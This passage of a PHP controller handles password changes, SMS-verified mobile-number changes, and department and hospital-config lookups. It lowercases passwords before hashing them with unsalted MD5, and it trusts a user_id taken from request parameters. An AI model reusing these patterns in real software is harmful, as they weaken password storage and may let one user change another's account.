		$userinfo = $user_main->where(array('id' => $user_id, 'passwd' => md5(strtolower($oldpassword)), 'is_activate' => 1, 'active' => 1, 'is_delete' => 0))->find();

		if (empty($userinfo)) {
			$result['msg_code'] = '0217';
			exit(returnjson($result));
		}

		$map = array('id' => $user_id);
		$password = md5(strtolower($newpassword));
		$data = array('passwd' => $password);

		if ($user_main->where($map)->save($data) !== false) {
			$result['msg'] = '用户密码修改成功！';
			$result['msg_code'] = '9007';
			exit(returnjson($result));
		}

		$result['msg_code'] = '0020';
		exit(returnjson($result));
	}

	public function sendVcodeByChangeMobile()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$mobile = strval($data['mobile']);
		$result = array();

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile, 'is_delete' => 0, 'active' => 1);
		$userinfo = $user_main->where($map)->find();

		if (!empty($userinfo)) {
			$result['msg_code'] = '0219';
			exit(returnjson($result));
		}

		$map = array('mobile' => $mobile, 'stype' => 4, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('addtime desc')->find();

		if (!empty($res)) {
			$last_time = $res['addtime'];
			$current_time = time();

			if (($current_time - $last_time) < 120) {
				$result['msg_code'] = '0015';
				exit(returnjson($result));
			}
		}

		$v_code = strtolower(randstrcode(6, 'NUMBER'));
		$msg = '您的验证码是：' . strval($v_code) . '。请不要把验证码泄露给其他人。如非本人操作，可不用理会！';
		$error_code = $this->sendSms($mobile, $msg);

		if ($error_code != 0) {
			$result['msg_code'] = '0034';
			exit(returnjson($result));
		}

		$data = array('user_id' => 0, 'mobile' => $mobile, 'msg' => $msg, 'v_code' => $v_code, 'stype' => 4, 'return_code' => $error_code, 'v_status' => 0, 'is_delete' => 0, 'addtime' => time());

		if ($user_sms->add($data)) {
			$result['msg'] = '验证短信已发送，请注意查收！';
			$result['msg_code'] = '9004';
			exit(returnjson($result));
		}
	}

	public function resetMobile()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$mobile = strval($data['mobile']);
		$v_code = strval($data['v_code']);
		$job_num = strval($data['job_num']);
		$result = array();

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		if (empty($v_code)) {
			$result['msg_code'] = '0054';
			exit(returnjson($result));
		}

		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile, 'v_code' => $v_code, 'stype' => 4, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('addtime desc')->find();

		if ($res['v_code'] != $v_code) {
			$result['msg_code'] = '0017';
			exit(returnjson($result));
		}

		$last_time = $res['addtime'];
		$current_time = time();

		if (120 < ($current_time - $last_time)) {
			$user_sms->where($map)->save(array('is_delete' => 1));
			$result['msg_code'] = '0035';
			exit(returnjson($result));
		}

		$res = $user_sms->where($map)->save(array('v_status' => 1));
		$user_main = m('user_main');
		$map = array('id' => $user_id, 'is_delete' => 0, 'is_activate' => 1, 'active' => 1);
		$data = array('mobile' => $mobile);

		if ($user_main->where($map)->save($data) !== false) {
			$old_data = $this->hgetallValueFromCache('user_id:' . $user_id);
			$this->hmsetValueToCache('user_id:' . $user_id, array_merge($old_data, $data));
			$result['msg'] = '修改手机号成功！';
			$result['msg_code'] = '9004';
			exit(returnjson($result));
		}

		$result['msg'] = '修改手机号失败！';
		$result['msg_code'] = '0012';
		exit(returnjson($result));
	}

	public function getDepartment()
	{
		$data = self::get_param();
		$parent_id = intval($data['parent_id']);
		$list = $this->getDepartmentList($parent_id);
		$result['data'] = $list;
		exit(returnjson($result));
	}

	public function getUserHospitalConfig()
	{
		$data = self::get_param();
		$hospital_id = intval($data['hospital_id']);
		$map = array(
			'cof_code'    => array(
				'in',
				array('100', '200', '300', '400', '500', '600')
				),
			'hospital_id' => $hospital_id,
			'active'      => 1,
			'is_delete'   => 0
			);
		$hospital_config = m('hospital_config');
		$info = $hospital_config->field('id,cof_key,cof_value,cof_value2,cof_code,rmark,hospital_id')->where($map)->select();
		$result['data'] = $info;
		exit(returnjson($result));
	}
}

?>
